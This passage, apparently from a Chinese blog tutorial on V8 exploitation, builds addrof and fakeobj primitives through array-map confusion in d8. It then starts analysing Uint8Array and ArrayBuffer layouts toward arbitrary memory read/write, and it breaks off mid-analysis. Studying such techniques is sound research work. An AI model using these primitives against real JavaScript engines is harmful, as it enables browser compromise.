+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">modify_double_arr_map</span>(<span style="color:#a6e22e">arr</span>, <span style="color:#a6e22e">obj_array_map</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">arr</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">modify_double_arr_map</span>(<span style="color:#a6e22e">arr</span>, <span style="color:#a6e22e">double_array_map</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">addrofobj</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">arr</span>[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#e6db74">&#34;0x00000000ffffffff&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">addrofobj</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>))
+</span></span></code></pre></div><p><code>oob</code> 函数的返回值是浮点型的，为了方便对其进行位运算，需要实现了类型转换函数 <code>ftoi</code>、<code>itof</code>。</p>
+<p>验证下效果：</p>
+<hr>
+<p><strong>ℹ️NOTE</strong>: 使用Release 版的 d8.exe</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./d8.exe --allow-natives-syntax
+</span></span><span style="display:flex;"><span>V8 version 9.4.0 <span style="color:#f92672">(</span>candidate<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>d8&gt; load<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;poc.js&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>8203ae1
+</span></span><span style="display:flex;"><span>8203b31
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8049901</span>
+</span></span><span style="display:flex;"><span>undefined
+</span></span><span style="display:flex;"><span>d8&gt; %DebugPrint<span style="color:#f92672">(</span>obj<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0x023108049901 &lt;Object map <span style="color:#f92672">=</span> 00000231082022D1&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{}</span>
+</span></span></code></pre></div><h3 id="fakeobj">fakeobj</h3>
+<p>把修改 map 顺序变换一下，就可以实现 fakeobj:</p>
+<ul>
+<li>把指针转换成浮点数，存入浮点数组</li>
+<li>浮点数组的 map 改成对象数组的</li>
+<li>把刚存入的指针当成对象读出。</li>
+<li>恢复 map</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">tagged_ptr</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">tagged_ptr</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">modify_double_arr_map</span>(<span style="color:#a6e22e">arr</span>, <span style="color:#a6e22e">obj_array_map</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arr</span>[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">modify_double_arr_map</span>(<span style="color:#a6e22e">arr</span>, <span style="color:#a6e22e">double_array_map</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>可以用数组构造 <code>tagged_ptr</code> 指向的内存：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">obj</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">modify_double_arr_map</span>(<span style="color:#a6e22e">arr</span>, <span style="color:#a6e22e">obj_array_map</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">arr</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">modify_double_arr_map</span>(<span style="color:#a6e22e">arr</span>, <span style="color:#a6e22e">double_array_map</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">arr</span>[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#e6db74">&#34;0x00000000ffffffff&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// fake a double Array
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">arr_contains_fake_obj</span> <span style="color:#f92672">=</span> [<span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">make_qword</span>(<span style="color:#a6e22e">double_array_map</span>, <span style="color:#ae81ff">0</span>)), <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">make_qword</span>(<span style="color:#a6e22e">double_array_map</span>, <span style="color:#ae81ff">6</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>)), <span style="color:#ae81ff">1.3</span>];
+</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">arr_contains_fake_obj</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fixed_arr_ends</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arr_begin</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">arr_contains_fake_obj</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">fixed_arr_ends</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 获取fakeobj的起始地址
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">fake_obj_tagged_ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fixed_arr_ends</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">fake_obj_tagged_ptr</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+</span></span></code></pre></div><p>刚好在下图红色框出的区域构造出了可以作为浮点数组使用的内存。</p>
+<p><img src="/assets/images/Pasted%20image%2020220219175057.png" alt=""></p>
+<p>这个伪造的数组：</p>
+<ul>
+<li>map：浮点数组 map <code>0x08203ae1</code></li>
+<li>properties：<code>0</code> 不会用到</li>
+<li>elements： <code>0x0820eae1</code>， 只是随便选了一个可访问的内存，没有特殊需要</li>
+<li>length：<code>0xc</code> =&gt; <code>6</code> 的 Smi 形式。</li>
+</ul>
+<p><code>arr_contains_fake_obj</code> 的地址减去 24 就可以是红框的起始地址，把这个起始地址转换成 tagged pointer 就可以用作 <code>fakeobj</code> 函数的参数。</p>
+<p>验证下效果：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// 调用 fakeobj 函数，得到伪造的数组
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fake_obj</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">fake_obj_tagged_ptr</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">fake_obj</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 读取伪造的数组的第一个元素
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">fake_obj</span>[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">readline</span>();
+</span></span></code></pre></div><p>./d8.exe &ndash;allow-natives-sytax poc.js 运行后输出如下:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>8203ae1
+</span></span><span style="display:flex;"><span>8203b31
+</span></span><span style="display:flex;"><span>8049bc9
+</span></span><span style="display:flex;"><span>0x01c908049d09 &lt;JSArray<span style="color:#f92672">[</span>3<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span>8049d09
+</span></span><span style="display:flex;"><span>8049cf1
+</span></span><span style="display:flex;"><span>0x01c908049cf1 &lt;JSArray<span style="color:#f92672">[</span>6<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span>1.6291488275489796e-260
+</span></span></code></pre></div><p><img src="/assets/images/Pasted%20image%2020220219173826.png" alt=""></p>
+<h3 id="任意内存读写">任意内存读、写</h3>
+<p>用 addrof 和 fakeobj，伪造一个 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint8Array"><code>Uint8Array</code></a> 对象，就可以实现任意内存读写。</p>
+<p>先分析 <code>Uint8Array</code> 对象的内存布局：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>// Debug 版运行
+</span></span><span style="display:flex;"><span>d8&gt; let u8a <span style="color:#f92672">=</span> new Uint8Array<span style="color:#f92672">(</span>8<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>undefined
+</span></span><span style="display:flex;"><span>d8&gt; %DebugPrint<span style="color:#f92672">(</span>u8a<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>DebugPrint: 000000A408108E21: <span style="color:#f92672">[</span>JSTypedArray<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - map: 0x00a4082c24d9 &lt;Map<span style="color:#f92672">(</span>UINT8ELEMENTS<span style="color:#f92672">)</span>&gt; <span style="color:#f92672">[</span>FastProperties<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - prototype: 0x00a408284efd &lt;Object map <span style="color:#f92672">=</span> 000000A4082C2501&gt;
+</span></span><span style="display:flex;"><span> - elements: 0x00a408108e11 &lt;ByteArray<span style="color:#f92672">[</span>8<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">[</span>UINT8ELEMENTS<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - embedder fields: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span> - buffer: 0x00a408108dd1 &lt;ArrayBuffer map <span style="color:#f92672">=</span> 000000A4082C3271&gt;
+</span></span><span style="display:flex;"><span> - byte_offset: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - byte_length: <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span> - length: <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span> - data_ptr: 000000A408108E18
+</span></span><span style="display:flex;"><span>   - base_pointer: 0000000008108E11
+</span></span><span style="display:flex;"><span>   - external_pointer: 000000A400000007
+</span></span><span style="display:flex;"><span> - properties: 0x00a40800222d &lt;FixedArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - All own properties <span style="color:#f92672">(</span>excluding elements<span style="color:#f92672">)</span>: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span> - elements: 0x00a408108e11 &lt;ByteArray<span style="color:#f92672">[</span>8<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>         0-7: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span> - embedder fields <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    0, aligned pointer: <span style="color:#ae81ff">0000000000000000</span>
+</span></span><span style="display:flex;"><span>    0, aligned pointer: <span style="color:#ae81ff">0000000000000000</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>000000A4082C24D9: <span style="color:#f92672">[</span>Map<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - type: JS_TYPED_ARRAY_TYPE
+</span></span><span style="display:flex;"><span> - instance size: <span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span> - inobject properties: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - elements kind: UINT8ELEMENTS
+</span></span><span style="display:flex;"><span> - unused property fields: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - enum length: invalid
+</span></span><span style="display:flex;"><span> - stable_map
+</span></span><span style="display:flex;"><span> - back pointer: 0x00a4080023b5 &lt;undefined&gt;
+</span></span><span style="display:flex;"><span> - prototype_validity cell: 0x00a408202405 &lt;Cell value<span style="color:#f92672">=</span> 1&gt;
+</span></span><span style="display:flex;"><span> - instance descriptors <span style="color:#f92672">(</span>own<span style="color:#f92672">)</span> <span style="color:#75715e">#0: 0x00a4080021c1 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span>
+</span></span><span style="display:flex;"><span> - prototype: 0x00a408284efd &lt;Object map <span style="color:#f92672">=</span> 000000A4082C2501&gt;
+</span></span><span style="display:flex;"><span> - constructor: 0x00a408284e85 &lt;JSFunction Uint8Array <span style="color:#f92672">(</span>sfi <span style="color:#f92672">=</span> 000000A408209E01<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - dependent code: 0x00a4080021b9 &lt;Other heap object <span style="color:#f92672">(</span>WEAK_FIXED_ARRAY_TYPE<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - construction counter: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0,0,0,0,0,0,0,0
+</span></span></code></pre></div><p><code>Uint8Array</code> 对应 <code>v8::internal::JSTypedArray</code>，分析源码得到如下内存布局：</p>
+<ul>
+<li>JSTypedArray
+<ul>
+<li>JSArrayBufferView
+<ul>
+<li>JSObject
+<ul>
+<li>map</li>
+<li>properties</li>
+<li>elements</li>
+</ul>
+</li>
+<li>Buffer: tagged pointer</li>
+<li>ByteOffset: intptr_t</li>
+<li>ByteLength: intptr_t</li>
+</ul>
+</li>
+<li>Length: intptr_t</li>
+<li>ExternalPointer: intptr_t</li>
+<li>BasePointer: Tagged Pointer</li>
+<li>BitFoeld: int32_t</li>
+<li>OptionalPadding: 对齐填充</li>
+</ul>
+</li>
+</ul>
+<p>查看内存：</p>
+<p><img src="/assets/images/Pasted%20image%2020220219191914.png" alt=""></p>
+<p>buffer 指向的是与 <code>Uint8Array</code> 关联的 <code>ArrayBuffer</code> 对象。<code>ArrayBuffer</code> 对应 <code>js::internal::JSArrayBuffer</code>，分析源码得到如下内存布局：</p>
+<ul>
+<li>JSArrayBuffer
+<ul>
+<li>JSObject
+<ul>
+<li>map</li>
+<li>properties</li>
+<li>elements</li>
+</ul>
+</li>
+<li>ByteLength: intptr_t</li>
+<li>MaxByteLength: intptr_t</li>
+<li>BackingStore: intptr_t</li>
+<li>Extension: intptr_t</li>
+<li>BitField: int32_t</li>
+<li>OptinalPadding: 对齐填充</li>
+</ul>
+</li>
+</ul>
+<p>用调试器分析这两个类型:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>d8&gt; let buf <span style="color:#f92672">=</span> new ArrayBuffer<span style="color:#f92672">(</span>8<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>undefined
+</span></span><span style="display:flex;"><span>d8&gt; let u8a <span style="color:#f92672">=</span> new Uint8Array<span style="color:#f92672">(</span>buf<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>undefined
+</span></span><span style="display:flex;"><span>d8&gt; u8a<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> 0xaa
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">170</span>
+</span></span><span style="display:flex;"><span>d8&gt; u8a<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> 0xbb
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">187</span>
+</span></span><span style="display:flex;"><span>d8&gt; u8a<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> 0xcc
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">204</span>
+</span></span><span style="display:flex;"><span>d8&gt; %DebugPrint<span style="color:#f92672">(</span>u8a<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>DebugPrint: 000000A40810A669: <span style="color:#f92672">[</span>JSTypedArray<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - map: 0x00a4082c24d9 &lt;Map<span style="color:#f92672">(</span>UINT8ELEMENTS<span style="color:#f92672">)</span>&gt; <span style="color:#f92672">[</span>FastProperties<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - prototype: 0x00a408284efd &lt;Object map <span style="color:#f92672">=</span> 000000A4082C2501&gt;
+</span></span><span style="display:flex;"><span> - elements: 0x00a408003245 &lt;ByteArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">[</span>UINT8ELEMENTS<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - embedder fields: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span> - buffer: 0x00a40810a5bd &lt;ArrayBuffer map <span style="color:#f92672">=</span> 000000A4082C3271&gt;
+</span></span><span style="display:flex;"><span> - byte_offset: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - byte_length: <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span> - length: <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span> - data_ptr: 0000021474AB8710
+</span></span><span style="display:flex;"><span>   - base_pointer: <span style="color:#ae81ff">0000000000000000</span>
+</span></span><span style="display:flex;"><span>   - external_pointer: 0000021474AB8710
+</span></span><span style="display:flex;"><span> - properties: 0x00a40800222d &lt;FixedArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - All own properties <span style="color:#f92672">(</span>excluding elements<span style="color:#f92672">)</span>: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span> - elements: 0x00a408003245 &lt;ByteArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>           0: <span style="color:#ae81ff">170</span>
+</span></span><span style="display:flex;"><span>           1: <span style="color:#ae81ff">187</span>
+</span></span><span style="display:flex;"><span>           2: <span style="color:#ae81ff">204</span>
+</span></span><span style="display:flex;"><span>         3-7: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span> - embedder fields <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    0, aligned pointer: <span style="color:#ae81ff">0000000000000000</span>
+</span></span><span style="display:flex;"><span>    0, aligned pointer: <span style="color:#ae81ff">0000000000000000</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>000000A4082C24D9: <span style="color:#f92672">[</span>Map<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - type: JS_TYPED_ARRAY_TYPE
+</span></span><span style="display:flex;"><span> - instance size: <span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span> - inobject properties: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - elements kind: UINT8ELEMENTS
+</span></span><span style="display:flex;"><span> - unused property fields: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - enum length: invalid
+</span></span><span style="display:flex;"><span> - stable_map
+</span></span><span style="display:flex;"><span> - back pointer: 0x00a4080023b5 &lt;undefined&gt;
+</span></span><span style="display:flex;"><span> - prototype_validity cell: 0x00a408202405 &lt;Cell value<span style="color:#f92672">=</span> 1&gt;
+</span></span><span style="display:flex;"><span> - instance descriptors <span style="color:#f92672">(</span>own<span style="color:#f92672">)</span> <span style="color:#75715e">#0: 0x00a4080021c1 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span>
+</span></span><span style="display:flex;"><span> - prototype: 0x00a408284efd &lt;Object map <span style="color:#f92672">=</span> 000000A4082C2501&gt;
+</span></span><span style="display:flex;"><span> - constructor: 0x00a408284e85 &lt;JSFunction Uint8Array <span style="color:#f92672">(</span>sfi <span style="color:#f92672">=</span> 000000A408209E01<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - dependent code: 0x00a4080021b9 &lt;Other heap object <span style="color:#f92672">(</span>WEAK_FIXED_ARRAY_TYPE<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - construction counter: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>170,187,204,0,0,0,0,0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	d8&gt; %DebugPrint<span style="color:#f92672">(</span>buf<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>DebugPrint: 000000A40810A5BD: <span style="color:#f92672">[</span>JSArrayBuffer<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - map: 0x00a4082c3271 &lt;Map<span style="color:#f92672">(</span>HOLEY_ELEMENTS<span style="color:#f92672">)</span>&gt; <span style="color:#f92672">[</span>FastProperties<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - prototype: 0x00a40828a129 &lt;Object map <span style="color:#f92672">=</span> 000000A4082C3299&gt;
+</span></span><span style="display:flex;"><span> - elements: 0x00a40800222d &lt;FixedArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">[</span>HOLEY_ELEMENTS<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - embedder fields: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span> - backing_store: 0000021474AB8710
+</span></span><span style="display:flex;"><span> - byte_length: <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span> - max_byte_length: <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span> - detachable
+</span></span><span style="display:flex;"><span> - properties: 0x00a40800222d &lt;FixedArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - All own properties <span style="color:#f92672">(</span>excluding elements<span style="color:#f92672">)</span>: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span> - embedder fields <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    0, aligned pointer: <span style="color:#ae81ff">0000000000000000</span>
+</span></span><span style="display:flex;"><span>    0, aligned pointer: <span style="color:#ae81ff">0000000000000000</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>000000A4082C3271: <span style="color:#f92672">[</span>Map<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - type: JS_ARRAY_BUFFER_TYPE
+</span></span><span style="display:flex;"><span> - instance size: <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span> - inobject properties: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - elements kind: HOLEY_ELEMENTS
+</span></span><span style="display:flex;"><span> - unused property fields: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - enum length: invalid
+</span></span><span style="display:flex;"><span> - stable_map
+</span></span><span style="display:flex;"><span> - back pointer: 0x00a4080023b5 &lt;undefined&gt;
+</span></span><span style="display:flex;"><span> - prototype_validity cell: 0x00a408202405 &lt;Cell value<span style="color:#f92672">=</span> 1&gt;
+</span></span><span style="display:flex;"><span> - instance descriptors <span style="color:#f92672">(</span>own<span style="color:#f92672">)</span> <span style="color:#75715e">#0: 0x00a4080021c1 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span>
+</span></span><span style="display:flex;"><span> - prototype: 0x00a40828a129 &lt;Object map <span style="color:#f92672">=</span> 000000A4082C3299&gt;
+</span></span><span style="display:flex;"><span> - constructor: 0x00a40828a055 &lt;JSFunction ArrayBuffer <span style="color:#f92672">(</span>sfi <span style="color:#f92672">=</span> 000000A40820EB31<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - dependent code: 0x00a4080021b9 &lt;Other heap object <span style="color:#f92672">(</span>WEAK_FIXED_ARRAY_TYPE<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - construction counter: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>object ArrayBuffer<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>JSTypedArray:</p>
+<p><img src="/assets/images/Pasted%20image%2020220219195501.png" alt=""></p>
+<p>JSArrayBuffer:</p>
+<p><img src="/assets/images/Pasted%20image%2020220219200057.png" alt=""></p>
+<p>BackingStore:</p>
+<p><img src="/assets/images/Pasted%20image%2020220219200218.png" alt=""></p>
+<p><code>JSArrayBuffer</code> 的 BackStore 应该是缓冲区的实际指针了。在调试器里把 BackStore 的地址 +4，看看读取到的数据是否变化。</p>
+<p><img src="/assets/images/Pasted%20image%2020220219200616.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>d8&gt; u8a<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> 0xdd
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">221</span>
+</span></span><span style="display:flex;"><span>d8&gt; u8a<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">221</span>
+</span></span><span style="display:flex;"><span>d8&gt; u8a
+</span></span><span style="display:flex;"><span>221,187,204,0,0,0,0,0
+</span></span></code></pre></div><p>没有达到预期的效果，分析下原因，backing_store 的开始，创建内存写入断点，之后执行 ua8[0] = 0xdd。程序断下，调用栈如下：</p>
+<p><img src="/assets/images/Pasted%20image%2020220220142131.png" alt=""></p>
+<p>分析调用栈后，发现写入地址是 <code>JSTypedArray::DataPtr()</code> 获取的：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> JSTypedArray<span style="color:#f92672">::</span>DataPtr() {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Zero-extend Tagged_t to Address according to current compression scheme
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// so that the addition with |external_pointer| (which already contains
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// compensated offset value) will decompress the tagged value.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// See JSTypedArray::ExternalPointerCompensationForOnHeapArray() for details.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  STATIC_ASSERT(kOffHeapDataPtrEqualsExternalPointer);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">void</span><span style="color:#f92672">*&gt;</span>(external_pointer() <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                                 <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span>Tagged_t<span style="color:#f92672">&gt;</span>(base_pointer().ptr()));
+</span></span><span style="display:flex;"><span>}
